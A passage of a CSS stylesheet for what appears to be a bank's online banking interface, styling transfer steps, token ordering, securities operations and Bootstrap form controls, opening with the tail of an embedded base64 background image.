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)no-repeat center center;
    background-size: auto 100%
}

#welcome .mying-discover-video:hover:after {
    background-size: auto 120%
}

#welcome .auth-mean-button:hover {
    background-color: rgb(251.55, 251.55, 251.55)
}

#welcome .ltmobilecard .card-content div.card-moreinfo:hover {
    box-shadow: 0px 6px 10px 0px rgba(0, 0, 0, 0.14), 0 1px 18px 0 rgba(0, 0, 0, 0.12), 0 3px 5px -1px rgba(0, 0, 0, 0.2)
}

#auth .center .auth-form .input-group .form-control:focus,
#auth .center .auth-form .input-group .form-control-sidemodal:focus {
    background-color: rgb(251.4, 251.4, 251.8)
}

#profile-selected .center .pincode-container .pincode-digit:after {
    border-color: #FF6200
}

#profile-selected .center .pincode-container .pincode-digit.filled:after {
    background: #FF6200
}

#create-access-code .pincode-container .pincode-digit:after {
    border-color: #FF6200
}

#create-access-code .pincode-container .pincode-digit.filled:after {
    background: #FF6200
}

#backdoor-users .contract .user:hover {
    font-weight: bold !important;
    color: #FF6200
}

#contentpane {
    padding-bottom: 30px
}

#contact-request .list-group-availability .list-group-item .day-parts .btn.selectable:active {
    color: white;
    background-color: #FF6200;
    border-color: #FF6200 !important
}

#contact-request .list-group-availability .list-group-item .day-parts .btn.selectable:active:hover,
#contact-request .list-group-availability .list-group-item .day-parts .btn.selectable.active:hover {
    color: white !important
}

#device-safety h3.list-group-heading-text.required::after {
    content: " *";
    color: #e74c3c;
    position: relative;
    top: 3px;
    font-weight: normal;
    font-size: 20px;
    line-height: 15px
}

#ipContainer .sales-area .form-group.required h5:after {
    display: none
}

#ipContainer .sales-area.step-account .btn-group.btn-group-radio-4 .btn:after {
    display: none
}

#contentpane #mailbox-conversation .top-details .pull-right .btn.btn-white:hover,
#contentpane #mailbox-conversation .top-details .pull-right .scrollpane #transactions-list .btn-group-radio.categories .btn:hover,
#contentpane .scrollpane #transactions-list .btn-group-radio.categories #mailbox-conversation .top-details .pull-right .btn:hover,
#contentpane #mailbox-conversation .top-details .pull-right .scrollpane #package-detail .btn-group-radio.categories .btn:hover,
#contentpane .scrollpane #package-detail .btn-group-radio.categories #mailbox-conversation .top-details .pull-right .btn:hover,
#contentpane #mailbox-conversation .top-details .pull-right .info-box .message-box .btn:hover:not(.btn-primary),
.info-box .message-box #contentpane #mailbox-conversation .top-details .pull-right .btn:hover:not(.btn-primary),
#contentpane #mailbox-conversation .top-details .pull-right .sales-area .message-box .btn:hover:not(.btn-primary),
.sales-area .message-box #contentpane #mailbox-conversation .top-details .pull-right .btn:hover:not(.btn-primary) {
    border-color: #FF6200
}

@media (min-width:1025px) {
    #fund-release-creation .transfer-step-btn-group:after {
        content: "";
        position: absolute;
        background-image: linear-gradient(rgba(0, 0, 0, 0), black);
        top: -4px;
        left: 0;
        width: 100%;
        height: 4px;
        opacity: 0.1
    }
}

#fund-release-creation .account-btn:before,
#fund-release-creation .account-btn:after {
    border: solid transparent;
    content: " ";
    height: 0;
    width: 0;
    position: absolute;
    pointer-events: none;
    visibility: visible;
    top: 26px;
    border-width: 24px 0 24px 16px;
    transition: border-color 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

#fund-release-creation .step-debit-account .account-btn:before {
    border-left-color: #f9f9f9;
    z-index: 2;
    right: -15px
}

#fund-release-creation .step-debit-account .account-btn:after {
    border-left-color: #A8A8A8;
    z-index: 1;
    right: -16px
}

#fund-release-creation .step-debit-account.activated .account-btn:after {
    border-left-color: #FF6200
}

#fund-release-creation .step-credit-account .account-btn:before {
    border-left-color: white;
    z-index: 2;
    left: -1px
}

#fund-release-creation .step-credit-account .account-btn:after {
    border-left-color: #A8A8A8;
    z-index: 1;
    left: 0px
}

#fund-release-creation .step-credit-account.activated .account-btn:after {
    border-left-color: #FF6200
}

@media (min-width:480px) {
    #fund-release-creation .transfer-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

@media (max-width:767px) {

    #fund-release-creation .account-btn:before,
    #fund-release-creation .account-btn:after {
        border: solid transparent;
        content: " ";
        height: 0;
        width: 0;
        position: absolute;
        pointer-events: none;
        visibility: visible;
        top: auto;
        right: auto;
        left: 50% !important;
        margin-left: -24px;
        border-width: 16px 24px 0 24px
    }

    #fund-release-creation .step-debit-account .account-btn:before {
        border-left-color: transparent;
        border-top-color: #f9f9f9;
        right: auto;
        bottom: -15px
    }

    #fund-release-creation .step-debit-account .account-btn:after {
        border-left-color: transparent;
        border-top-color: #A8A8A8;
        right: auto;
        bottom: -16px
    }

    #fund-release-creation .step-debit-account.activated .account-btn:after {
        border-left-color: transparent;
        border-top-color: #FF6200
    }

    #fund-release-creation .step-credit-account .account-btn:before {
        border-left-color: transparent;
        border-top-color: white;
        top: -1px
    }

    #fund-release-creation .step-credit-account .account-btn:after {
        border-left-color: transparent;
        border-top-color: #A8A8A8;
        top: 0px
    }

    #fund-release-creation .step-credit-account.activated .account-btn:after {
        border-left-color: transparent;
        border-top-color: #FF6200
    }
}

@media (min-width:768px) {
    #fund-release-creation .transfer-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

.side-modal .btn-group-radio.transfer-types:after {
    content: "";
    display: table;
    clear: both
}

.side-modal .btn-group-radio.transfer-types .transfer-type:after {
    content: " ";
    display: block;
    width: 100%;
    height: 0;
    position: absolute;
    left: 0;
    bottom: 0;
    background-color: #FF6200;
    transition: height 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.side-modal .btn-group-radio.transfer-types .transfer-type.selected:after {
    height: 5px
}

@media (min-width:768px) {
    #new-transfer .transfer-step-btn-group:after {
        content: "";
        position: absolute;
        background-image: linear-gradient(rgba(0, 0, 0, 0), black);
        top: -4px;
        left: 0;
        width: 100%;
        height: 4px;
        opacity: 0.1
    }
}

#new-transfer .confirmation-step .info-box .fees-link:hover,
#new-transfer .confirmation-step .sales-area .fees-link:hover {
    color: #696969
}

#new-transfer .account-btn:hover {
    box-shadow: rgba(0, 0, 0, 0.14)0 8px 10px 1px, rgba(0, 0, 0, 0.12)0 3px 14px 2px, rgba(0, 0, 0, 0.2)0 5px 5px -3px
}

@media (min-width:480px) {
    #new-transfer .transfer-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

@media (max-width:767px) {
    #new-transfer .step-debit-account.activated .account-btn:after {
        border-left-color: transparent;
        border-top-color: #FF6200
    }
}

@media (min-width:768px) {
    #new-transfer .transfer-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

.side-modal .btn-group-radio.transfer-types:after {
    content: "";
    display: table;
    clear: both
}

.side-modal .btn-group-radio.transfer-types .transfer-type:after {
    content: " ";
    display: block;
    width: 100%;
    height: 0;
    position: absolute;
    left: 0;
    bottom: 0;
    background-color: #FF6200;
    transition: height 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

.side-modal .btn-group-radio.transfer-types .transfer-type.selected:after {
    height: 5px
}

#orderluxtrusttoken h3.list-group-heading-text.required::after {
    content: " *";
    color: #e74c3c;
    position: relative;
    top: 3px;
    font-weight: normal;
    font-size: 20px;
    line-height: 15px
}

@media (min-width:1025px) {
    #orderluxtrusttoken .orderluxtrusttoken-step-btn-group:after {
        content: "";
        position: absolute;
        background-image: linear-gradient(rgba(0, 0, 0, 0), black);
        top: -4px;
        left: 0;
        width: 100%;
        height: 4px;
        opacity: 0.1
    }
}

@media (min-width:480px) {
    #orderluxtrusttoken .orderluxtrusttoken-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

@media (min-width:768px) {
    #orderluxtrusttoken .orderluxtrusttoken-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

.timeline .timeline-item:before {
    content: "";
    width: 14px;
    height: 14px;
    border-radius: 7px;
    border: 2px solid #A8A8A8;
    background: white;
    position: absolute;
    left: -28px;
    top: 0
}

.bs-btn-outline-ing-indigo-unchanged:hover,
.bs-btn-outline-ing-indigo-unchanged:active {
    color: #525199 !important;
    background-color: transparent !important;
    border-color: #525199 !important
}

#contentpane .scrollpane #securities-operation .account-btn:before,
#contentpane .scrollpane #securities-operation .account-btn:after {
    border: solid transparent;
    content: " ";
    height: 0;
    width: 0;
    position: absolute;
    pointer-events: none;
    visibility: visible;
    top: 26px;
    border-width: 24px 0 24px 16px;
    transition: border-color 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

#contentpane .scrollpane #securities-operation .from-account .account-btn:before {
    border-left-color: #f9f9f9;
    z-index: 2;
    right: -15px
}

#contentpane .scrollpane #securities-operation .from-account .account-btn:after {
    border-left-color: #A8A8A8;
    z-index: 1;
    right: -16px
}

#contentpane .scrollpane #securities-operation .from-account.activated .account-btn:after {
    border-left-color: #FF6200
}

#contentpane .scrollpane #securities-operation .to-account .account-btn:before {
    border-left-color: white;
    z-index: 2;
    left: -1px
}

#contentpane .scrollpane #securities-operation .to-account .account-btn:after {
    border-left-color: #A8A8A8;
    z-index: 1;
    left: 0px
}

#contentpane .scrollpane #securities-operation .to-account.activated .account-btn:after {
    border-left-color: #FF6200
}

@media (max-width:767px) {

    #contentpane .scrollpane #securities-operation .account-btn:before,
    #contentpane .scrollpane #securities-operation .account-btn:after {
        border: solid transparent;
        content: " ";
        height: 0;
        width: 0;
        position: absolute;
        pointer-events: none;
        visibility: visible;
        top: auto;
        right: auto;
        border-width: 16px 24px 0 24px
    }

    #contentpane .scrollpane #securities-operation .from-account .account-btn:before {
        border-left-color: transparent;
        border-top-color: #f9f9f9;
        right: auto;
        bottom: -15px
    }

    #contentpane .scrollpane #securities-operation .from-account .account-btn:after {
        border-left-color: transparent;
        border-top-color: #A8A8A8;
        right: auto;
        bottom: -16px
    }

    #contentpane .scrollpane #securities-operation .from-account.activated .account-btn:after {
        border-left-color: transparent;
        border-top-color: #FF6200
    }

    #contentpane .scrollpane #securities-operation .to-account .account-btn:before {
        border-left-color: transparent;
        border-top-color: white;
        left: auto;
        top: -1px
    }

    #contentpane .scrollpane #securities-operation .to-account .account-btn:after {
        border-left-color: transparent;
        border-top-color: #A8A8A8;
        left: auto;
        top: 0px
    }

    #contentpane .scrollpane #securities-operation .to-account.activated .account-btn:after {
        border-left-color: transparent;
        border-top-color: #FF6200
    }
}

#contentpane .scrollpane #toolbox-home .row:before {
    content: none;
    display: none
}

#contentpane .scrollpane #toolbox-home .tool-container:hover {
    background-color: #f9f9f9
}

#tfr-renewal-detail .tfr-renewal-input .radio .radio-button:after {
    content: " ";
    display: block;
    width: 4px;
    height: 4px;
    border-radius: 2px;
    background-color: white;
    position: absolute;
    top: 3px;
    left: 3px;
    transition: background-color 0.3s cubic-bezier(0.465, 0.183, 0.153, 0.946)
}

#tfr-renewal-detail .tfr-renewal-input .radio input:checked~.radio-button {
    border-color: #FF6200
}

#tfr-renewal-detail .tfr-renewal-input .radio input:checked~.radio-button:after {
    background-color: #FF6200
}

#transaction-detail .intervention:after {
    content: "";
    display: table;
    clear: both
}

#contentpane .scrollpane .container-fluid#notifications-list .list-group .list-group-item .pull-right:after {
    display: none
}

#ltrekey h3.list-group-heading-text.required::after {
    content: " *";
    color: #e74c3c;
    position: relative;
    top: 3px;
    font-weight: normal;
    font-size: 20px;
    line-height: 15px
}

@media (min-width:1025px) {
    #ltrekey .ltrekey-step-btn-group:after {
        content: "";
        position: absolute;
        background-image: linear-gradient(rgba(0, 0, 0, 0), black);
        top: -4px;
        left: 0;
        width: 100%;
        height: 4px;
        opacity: 0.1
    }
}

@media (min-width:480px) {
    #ltrekey .ltrekey-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

@media (min-width:768px) {
    #ltrekey .ltrekey-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

#container-offboarding .container-fluid .link:hover {
    background-color: #e6e5f0
}

@media (min-width:1025px) {
    #container-offboarding .container-fluid .offboarding-step-btn-group:after {
        content: "";
        position: absolute;
        background-image: linear-gradient(rgba(0, 0, 0, 0), black);
        top: -4px;
        left: 0;
        width: 100%;
        height: 4px;
        opacity: 0.1
    }
}

@media (min-width:480px) {
    #container-offboarding .container-fluid .offboarding-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}

@media (min-width:768px) {
    #container-offboarding .container-fluid .offboarding-step-btn-group:after {
        content: "";
        display: table;
        clear: both
    }
}
</style>
<style>
:root {
    --bs-blue: #0d6efd;
    --bs-indigo: #6610f2;
    --bs-purple: #6f42c1;
    --bs-pink: #d63384;
    --bs-red: #dc3545;
    --bs-orange: #fd7e14;
    --bs-yellow: #ffc107;
    --bs-green: #198754;
    --bs-teal: #20c997;
    --bs-cyan: #0dcaf0;
    --bs-black: #000;
    --bs-white: #fff;
    --bs-gray: #6c757d;
    --bs-gray-dark: #343a40;
    --bs-ing-orange: #ff6200;
    --bs-ing-indigo: #525199;
    --bs-ing-grey: #696969;
    --bs-ing-sky-100: #eff6fb;
    --bs-gray-100: #f8f9fa;
    --bs-gray-200: #e9ecef;
    --bs-gray-300: #dee2e6;
    --bs-gray-400: #ced4da;
    --bs-gray-500: #adb5bd;
    --bs-gray-600: #6c757d;
    --bs-gray-700: #495057;
    --bs-gray-800: #343a40;
    --bs-gray-900: #212529;
    --bs-primary: #0d6efd;
    --bs-secondary: #6c757d;
    --bs-success: #198754;
    --bs-info: #0dcaf0;
    --bs-warning: #ffc107;
    --bs-danger: #dc3545;
    --bs-light: #f8f9fa;
    --bs-dark: #212529;
    --bs-ing-orange: #ff6200;
    --bs-ing-indigo: #525199;
    --bs-ing-grey: #696969;
    --bs-ing-sky-100: #eff6fb;
    --bs-primary-rgb: 13, 110, 253;
    --bs-secondary-rgb: 108, 117, 125;
    --bs-success-rgb: 25, 135, 84;
    --bs-info-rgb: 13, 202, 240;
    --bs-warning-rgb: 255, 193, 7;
    --bs-danger-rgb: 220, 53, 69;
    --bs-light-rgb: 248, 249, 250;
    --bs-dark-rgb: 33, 37, 41;
    --bs-ing-orange-rgb: 255, 98, 0;
    --bs-ing-indigo-rgb: 82, 81, 153;
    --bs-ing-grey-rgb: 105, 105, 105;
    --bs-ing-sky-100-rgb: 239, 246, 251;
    --bs-primary-text-emphasis: rgb(5.2, 44, 101.2);
    --bs-secondary-text-emphasis: rgb(43.2, 46.8, 50);
    --bs-success-text-emphasis: rgb(10, 54, 33.6);
    --bs-info-text-emphasis: rgb(5.2, 80.8, 96);
    --bs-warning-text-emphasis: rgb(102, 77.2, 2.8);
    --bs-danger-text-emphasis: rgb(88, 21.2, 27.6);
    --bs-light-text-emphasis: #495057;
    --bs-dark-text-emphasis: #495057;
    --bs-primary-bg-subtle: rgb(206.6, 226, 254.6);
    --bs-secondary-bg-subtle: rgb(225.6, 227.4, 229);
    --bs-success-bg-subtle: rgb(209, 231, 220.8);
    --bs-info-bg-subtle: rgb(206.6, 244.4, 252);
    --bs-warning-bg-subtle: rgb(255, 242.6, 205.4);
    --bs-danger-bg-subtle: rgb(248, 214.6, 217.8);
    --bs-light-bg-subtle: rgb(251.5, 252, 252.5);
    --bs-dark-bg-subtle: #ced4da;
    --bs-primary-border-subtle: rgb(158.2, 197, 254.2);
    --bs-secondary-border-subtle: rgb(196.2, 199.8, 203);
    --bs-success-border-subtle: rgb(163, 207, 186.6);
    --bs-info-border-subtle: rgb(158.2, 233.8, 249);
    --bs-warning-border-subtle: rgb(255, 230.2, 155.8);
    --bs-danger-border-subtle: rgb(241, 174.2, 180.6);
    --bs-light-border-subtle: #e9ecef;
    --bs-dark-border-subtle: #adb5bd;
    --bs-white-rgb: 255, 255, 255;
    --bs-black-rgb: 0, 0, 0;
    --bs-font-sans-serif: ingme, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", "Noto Sans", "Liberation Sans", Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
    --bs-font-monospace: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
    --bs-gradient: linear-gradient(180deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0));
    --bs-body-font-family: var(--bs-font-sans-serif);
    --bs-body-font-size: 1rem;
    --bs-body-font-weight: 400;
    --bs-body-line-height: 1.5;
    --bs-body-color: #212529;
    --bs-body-color-rgb: 33, 37, 41;
    --bs-body-bg: #fff;
    --bs-body-bg-rgb: 255, 255, 255;
    --bs-emphasis-color: #000;
    --bs-emphasis-color-rgb: 0, 0, 0;
    --bs-secondary-color: rgba(33, 37, 41, 0.75);
    --bs-secondary-color-rgb: 33, 37, 41;
    --bs-secondary-bg: #e9ecef;
    --bs-secondary-bg-rgb: 233, 236, 239;
    --bs-tertiary-color: rgba(33, 37, 41, 0.5);
    --bs-tertiary-color-rgb: 33, 37, 41;
    --bs-tertiary-bg: #f8f9fa;
    --bs-tertiary-bg-rgb: 248, 249, 250;
    --bs-heading-color: inherit;
    --bs-link-color: #0d6efd;
    --bs-link-color-rgb: 13, 110, 253;
    --bs-link-decoration: underline;
    --bs-link-hover-color: rgb(10.4, 88, 202.4);
    --bs-link-hover-color-rgb: 10, 88, 202;
    --bs-code-color: #d63384;
    --bs-highlight-color: #212529;
    --bs-highlight-bg: rgb(255, 242.6, 205.4);
    --bs-border-width: 1px;
    --bs-border-style: solid;
    --bs-border-color: #949494;
    --bs-border-color-translucent: rgba(0, 0, 0, 0.175);
    --bs-border-radius: 0.375rem;
    --bs-border-radius-sm: 0.25rem;
    --bs-border-radius-lg: 0.5rem;
    --bs-border-radius-xl: 1rem;
    --bs-border-radius-xxl: 2rem;
    --bs-border-radius-2xl: var(--bs-border-radius-xxl);
    --bs-border-radius-pill: 50rem;
    --bs-box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15);
    --bs-box-shadow-sm: 0 0.125rem 0.25rem rgba(0, 0, 0, 0.075);
    --bs-box-shadow-lg: 0 1rem 3rem rgba(0, 0, 0, 0.175);
    --bs-box-shadow-inset: inset 0 1px 2px rgba(0, 0, 0, 0.075);
    --bs-focus-ring-width: 0.125rem;
    --bs-focus-ring-opacity: 0.5;
    --bs-focus-ring-color: rgba(13, 110, 253, 0.5);
    --bs-form-valid-color: #198754;
    --bs-form-valid-border-color: #198754;
    --bs-form-invalid-color: #dc3545;
    --bs-form-invalid-border-color: #dc3545
}

.bs-form-control[type=file]:not(:disabled):not([readonly]) {
    cursor: pointer
}

.bs-form-control:focus {
    color: var(--bs-body-color);
    background-color: var(--bs-body-bg);
    border-color: rgb(134, 182.5, 254);
    outline: 0;
    box-shadow: 0 0 0 0.125rem rgba(13, 110, 253, 0.5)
}

.bs-form-control::-webkit-date-and-time-value {
    min-width: 85px;
    height: 1.5em;
    margin: 0
}

.bs-form-control::-webkit-datetime-edit {
    display: block;
    padding: 0
}

.bs-form-control::placeholder {
    color: var(--bs-secondary-color);
    opacity: 1
}

.bs-form-control:disabled {
    background-color: var(--bs-secondary-bg);
    opacity: 1
}

.bs-form-control::file-selector-button {
    padding: 0.5rem 1rem;
    margin: -0.5rem -1rem;
    margin-inline-end: 1rem;
    color: var(--bs-body-color);
    background-color: var(--bs-tertiary-bg);
    pointer-events: none;
    border-color: inherit;
    border-style: solid;
    border-width: 0;
    border-inline-end-width: var(--bs-border-width);
    border-radius: 0;
    transition: color 0.15s ease-in-out, background-color 0.15s ease-in-out, border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out
}

@media (prefers-reduced-motion:reduce) {
    .bs-form-control::file-selector-button {
        transition: none
    }
}

.bs-form-control:hover:not(:disabled):not([readonly])::file-selector-button {
    background-color: var(--bs-secondary-bg)
}

.bs-form-control-plaintext:focus {
    outline: 0
}

.bs-form-control-sm::file-selector-button {
    padding: 0.375rem 0.75;
    margin: -0.375rem -0.75;
    margin-inline-end: 0.75
}

.bs-form-control-lg::file-selector-button {
    padding: 0.625rem 1.25rem;
    margin: -0.625rem -1.25rem;
    margin-inline-end: 1.25rem
}

.bs-form-control-color:not(:disabled):not([readonly]) {
    cursor: pointer
}

.bs-form-control-color::-moz-color-swatch {
    border: 0 !important;
    border-radius: 0.25rem
}

.bs-form-control-color::-webkit-color-swatch {
    border: 0 !important;
    border-radius: 0.25rem
}

.bs-form-select:focus {
    border-color: rgb(134, 182.5, 254);
    outline: 0;
    box-shadow: 0 0 0 0.125rem rgba(13, 110, 253, 0.5)
}

.bs-form-select:disabled {
    background-color: var(--bs-secondary-bg)
}

.bs-form-select:-moz-focusring {
    color: transparent;
    text-shadow: 0 0 0 var(--bs-body-color)
}

.bs-form-check-input:active {
    filter: brightness(90%)
}

.bs-form-check-input:focus {
    border-color: rgb(134, 182.5, 254);
    outline: 0;
    box-shadow: 0 0 0 0.125rem rgba(13, 110, 253, 0.5)
}

.bs-form-check-input:checked {
    background-color: #0d6efd;
    border-color: #0d6efd
}

.bs-form-check-input:checked[type=checkbox] {
